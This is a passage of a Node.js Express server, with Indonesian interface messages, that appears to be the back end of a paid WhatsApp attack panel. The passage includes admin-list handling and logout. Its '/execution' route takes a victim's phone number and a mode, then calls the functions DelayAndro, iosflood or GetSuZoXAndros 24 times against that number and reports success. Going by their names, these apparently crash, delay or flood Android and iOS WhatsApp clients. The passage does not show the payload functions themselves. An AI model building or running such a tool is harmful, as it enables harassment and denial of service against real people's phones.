          "/dashboard?msg=" + encodeURIComponent(`⚠️ ID ${idNum} sudah ada di admin.json.`) + "&type=warning"
        );
      }

      adminData.push(idNum);
      fs.writeFileSync(adminPath, JSON.stringify(adminData, null, 2));
      return res.redirect(
        "/dashboard?msg=" + encodeURIComponent(`✅ ID ${idNum} berhasil ditambahkan ke admin.json!`) + "&type=success"
      );
    }

    return res.redirect(
      "/dashboard?msg=" + encodeURIComponent("❌ Role tidak dikenal!") + "&type=error"
    );
  } catch (err) {
    console.error(err);
    return res.redirect(
      "/dashboard?msg=" + encodeURIComponent("❌ Terjadi kesalahan server!") + "&type=error"
    );
  }
});

app.get("/execution", (req, res) => {
  const username = req.cookies.sessionUser;
  const msg = req.query.msg || "";
  const filePath = "./Tredict-View/Login.html";

  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");

    if (!username) return res.send(html);

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.send(html);
    }

    const targetNumber = req.query.target;
    const mode = req.query.mode;
    const target = `${targetNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
        message: "Tunggu sampai maintenance selesai..."
      }, false, currentUser, "", mode));
    }

    if (!targetNumber) {
      if (!mode) {
        return res.send(executionPage("✅ Server ON", {
          message: "Pilih mode yang ingin digunakan."
        }, true, currentUser, "", ""));
      }

      if (["andros", "ios", "fcios"].includes(mode)) {
        return res.send(executionPage("✅ Server ON", {
          message: "Masukkan nomor target (62xxxxxxxxxx)."
        }, true, currentUser, "", mode));
      }

      return res.send(executionPage("❌ Mode salah", {
        message: "Mode tidak dikenali. Gunakan ?mode=andros atau ?mode=ios."
      }, false, currentUser, "", ""));
    }

    if (!/^\d+$/.test(targetNumber)) {
      return res.send(executionPage("❌ Format salah", {
        target: targetNumber,
        message: "Nomor harus hanya angka dan diawali dengan nomor negara"
      }, true, currentUser, "", mode));
    }

    try {
      if (mode === "andros") {
        DelayAndro(24, target);
      } else if (mode === "ios") {
        iosflood(24, target);
      } else if (mode === "fcios") {
        GetSuZoXAndros(24, target);
      } else {
        throw new Error("Mode tidak dikenal.");
      }

      return res.send(executionPage("✅ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`
      }, false, currentUser, "", mode));
    } catch (err) {
      return res.send(executionPage("❌ Gagal kirim", {
        target: targetNumber,
        message: err.message || "Terjadi kesalahan saat pengiriman."
      }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
    }
  });
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

app.listen(PORT, () => {
  console.log(`✅ Server aktif di port ${PORT}`);
});
